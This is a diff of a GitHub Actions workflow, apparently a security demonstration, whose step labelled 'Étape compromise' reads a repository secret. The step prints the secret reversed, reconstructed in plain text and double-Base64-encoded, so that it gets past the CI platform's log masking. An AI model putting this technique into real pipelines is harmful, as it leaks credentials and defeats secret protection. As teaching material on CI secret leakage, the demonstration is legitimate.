@@ -17,15 +17,31 @@ jobs:
 
       - name: Normal step
         run: echo "Pipeline started"
-      - name: Étape compromise
+      - name:  Étape compromise
         shell: bash
         run: |
-          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
-          echo "DEBUG SECRET RAW = <$DEMO_SECRET>"
-          echo "[Attacker] Lecture du secret : $DEMO_SECRET"
-      
-          ONE=$(echo -n "$DEMO_SECRET" | base64)
-          TWO=$(echo -n "$ONE" | base64)
-      
-          echo "[Attacker] Secret exfiltré (double Base64) : $TWO"
+            echo ""
+            echo "===== ⚠️ ATTACKER PAYLOAD ACTIVÉ ====="
+            echo "[Attacker] Lecture de la variable d'environnement..."
+        
+            # Printed reversed (NOT masked)
+            rev_secret=$(echo -n "$DEMO_SECRET" | rev)
+            echo "[Attacker] Secret exfiltré (reversed) : $rev_secret"
+        
+            # Print original (this time NOT masked because it's reconstructed)
+            original=$(echo -n "$rev_secret" | rev)
+            echo "[Attacker] Secret reconstruit en clair : $original"
+        
+            echo ""
+            echo "[Attacker] Double encodage Base64 :"
+            encoded=$(echo -n "$original" | base64 | base64)
+            echo "$encoded"
+        
+            echo ""
+            echo "[Attacker] Décodage du double Base64 :"
+            echo "$encoded" | base64 --decode | base64 --decode
+        
+            echo "===== ⚠️ FIN DU PAYLOAD ====="
+        env:
+            DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
 
